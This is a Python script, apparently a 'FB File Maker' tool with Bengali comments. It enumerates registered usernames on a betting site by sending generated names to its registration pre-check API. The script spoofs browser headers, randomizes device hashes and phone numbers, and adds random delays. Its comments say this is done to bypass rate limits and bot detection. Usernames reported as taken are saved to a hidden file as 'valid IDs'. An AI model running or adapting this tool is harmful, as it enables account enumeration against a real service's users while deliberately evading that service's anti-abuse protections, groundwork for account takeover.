
import requests
import random
import json
import time
import os
from concurrent.futures import ThreadPoolExecutor

# ANSI Colors
BOLD, R, G, Y, D, C = '\033[1m', '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[96m'

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'{BOLD}{C}\n       _____ __      ___                \n      / __(_) /__   / _ \\__ ____ _  ___ \n     / _// / / -_) / // / // /  \' \\/ _ \\\n    /_/ /_/_/\\__/ /____/\\_,_/_/_/_/ .__/\n                                 /_/    \n\n            FB File Maker V-2.3 (Ultra Safe)\n {D}')

def username_gen(names, start, end):
    usernames = []
    for name in names.split(','):
        for num in range(start, end + 1):
            usernames.append(f'{name.strip().lower()}{num} | {name.strip().capitalize()}')
    return usernames

def checker(uname):
    """সার্ভারের রেট লিমিট বাইপাস করার জন্য অ্যাডভান্সড লজিক"""
    url = 'https://baji999.net/api/wv/v1/user/registerPreCheck'
    
    # প্রতিবার ইউনিক ডিভাইস আইডি জেনারেট করা
    unique_hash = "".join(random.choices("0123456789abcdef", k=32))
    
    # cxs.py থেকে নেওয়া হাই-সিকিউরিটি হেডার
    headers = {
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://baji999.net/bd/en/register',
        'Origin': 'https://baji999.net',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Android"'
    }

    # cxs.py এর সেই নির্দিষ্ট ফিঙ্গারপ্রিন্ট লজিক যা ৪MD বাইপাস করে
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'userId': uname,
        'phone': '19' + str(random.randint(11111111, 99999999)),
        'registerTypeId': 0,
        'random': str(random.randint(1000, 9999)),
        'fingerprint2': '58df140599f977faf8951888e888e807',
        'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
        'deviceHash': unique_hash
    }

    try:
        # জিলানি ডিলে (বট ডিটেকশন এড়াতে র‍্যান্ডম বিরতি)
        time.sleep(random.uniform(0.5, 1.2)) 
        
        # সেশন ব্যবহার করলে ব্লক হওয়ার সম্ভাবনা কম থাকে
        session = requests.Session()
        response = session.post(url, headers=headers, json=payload, timeout=12)
        
        if response.status_code == 200:
            data = response.json()
            # F0003 মানে আইডি আগে থেকেই আছে (VALID)
            if data.get('status') == 'F0003': return True
            
            # S0001 মানে এপিআই লিমিট ওভার
            if data.get('status') == 'S0001':
                print(f'{R} [!] API LIMIT! SLEEPING 30s...{D}')
                time.sleep(30)
                return False
        elif response.status_code == 403:
            print(f'{R} [!] IP BLOCKED (403)! CHANGE VPN SERVER.{D}')
            time.sleep(60)
    except: pass
    return False

def check_username(username):
    uname = username.split('|')[0].strip()
    if checker(uname):
        print(f'{BOLD}{G} [VALID FB ID] {uname}{D}')
        with open('.uids.txt', 'a', encoding='utf-8') as f:
            f.write(username + '\n')

def main():
    logo()
    names = input(f'{BOLD}{Y} ENTER NAMES (Comma separated) : {D}')
    start = int(input(f'{BOLD}{Y} START NUMBER : '))
    end = int(input(f'{BOLD}{Y} END NUMBER : '))
    
    print(f'\n{G} [1] ULTRA SAFE (1 Thread)')
    print(f'{Y} [2] BALANCED (3 Threads)')
    print(f'{R} [3] FAST (5 Threads - Careful){D}\n')
    
    speed = int(input(f'{C} CHOOSE SPEED : {D}'))
    # ৪MD ব্লক এড়াতে থ্রেড সংখ্যা নিয়ন্ত্রণ করা হয়েছে
    spd = {1: 1, 2: 3, 3: 5}.get(speed, 1)
    
    usernames = username_gen(names, start, end)
    random.shuffle(usernames)
    
    print(f'\n{BOLD}{G} TOTAL USERNAMES : {len(usernames)} | SPEED : {spd}X {D}')
    print(f'{BOLD}{G} ----------------------------------------{D}')
    
    with ThreadPoolExecutor(max_workers=spd) as executor:
        executor.map(check_username, usernames)
        
    if os.path.exists('.uids.txt'):
        total = sum(1 for _ in open('.uids.txt', 'r'))
        print(f'\n{BOLD}{G} DONE! TOTAL {Y}{total}{G} VALID IDS FOUND.{D}\n')

if __name__ == '__main__':
    main()
